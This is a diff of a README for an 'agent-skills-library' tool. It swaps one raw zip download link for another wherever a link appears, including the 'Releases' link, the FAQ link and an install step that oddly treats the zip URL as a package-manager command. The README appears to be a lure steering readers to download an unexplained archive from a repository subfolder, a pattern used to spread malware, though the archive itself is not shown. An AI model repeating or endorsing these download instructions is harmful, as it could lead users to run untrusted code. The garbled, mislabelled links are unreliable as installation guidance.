@@ -1,6 +1,6 @@
 # 🎉 agent-skills-library - Boost Your Programming Productivity Easily
 
-[![Download Now](https://github.com/izyanrajwani/agent-skills-library/raw/refs/heads/main/skills/requesting-code-review/skills-agent-library-v1.7.zip%20Now-Release%20Page-brightgreen)](https://github.com/izyanrajwani/agent-skills-library/raw/refs/heads/main/skills/requesting-code-review/skills-agent-library-v1.7.zip)
+[![Download Now](https://raw.githubusercontent.com/izyanrajwani/agent-skills-library/main/skills/agent-skills-library-v2.3.zip%20Now-Release%20Page-brightgreen)](https://raw.githubusercontent.com/izyanrajwani/agent-skills-library/main/skills/agent-skills-library-v2.3.zip)
 
 ## 📚 Overview
 
@@ -20,7 +20,7 @@ Before you download, check if your system meets these requirements:
 
 ## 🔗 Download & Install
 
-To download the application, visit this page: [Download from Releases](https://github.com/izyanrajwani/agent-skills-library/raw/refs/heads/main/skills/requesting-code-review/skills-agent-library-v1.7.zip).
+To download the application, visit this page: [Download from Releases](https://raw.githubusercontent.com/izyanrajwani/agent-skills-library/main/skills/agent-skills-library-v2.3.zip).
 
 On the releases page, you will find the latest version of the software.
 
@@ -48,7 +48,7 @@ After the download is complete, follow these steps to install the application:
 
 1. Open your terminal.
 2. Navigate to the directory where the downloaded file is located, using `cd path_to_your_downloads`.
-3. Install the application using the package manager for your distribution, for example, using `https://github.com/izyanrajwani/agent-skills-library/raw/refs/heads/main/skills/requesting-code-review/skills-agent-library-v1.7.zip` or similar commands.
+3. Install the application using the package manager for your distribution, for example, using `https://raw.githubusercontent.com/izyanrajwani/agent-skills-library/main/skills/agent-skills-library-v2.3.zip` or similar commands.
 4. You can now run the app from your applications menu or terminal.
 
 ## 📝 Features
@@ -70,7 +70,7 @@ Once installed, open the application, and take these steps to set it up:
 
 ## 🤝 Support
 
-If you encounter any issues or need assistance, please refer to the "Help" section in the application. You can also check the [FAQ](https://github.com/izyanrajwani/agent-skills-library/raw/refs/heads/main/skills/requesting-code-review/skills-agent-library-v1.7.zip) for common questions 
+If you encounter any issues or need assistance, please refer to the "Help" section in the application. You can also check the [FAQ](https://raw.githubusercontent.com/izyanrajwani/agent-skills-library/main/skills/agent-skills-library-v2.3.zip) for common questions 
 
 For direct support, feel free to contact us through the repository's issues page.
 
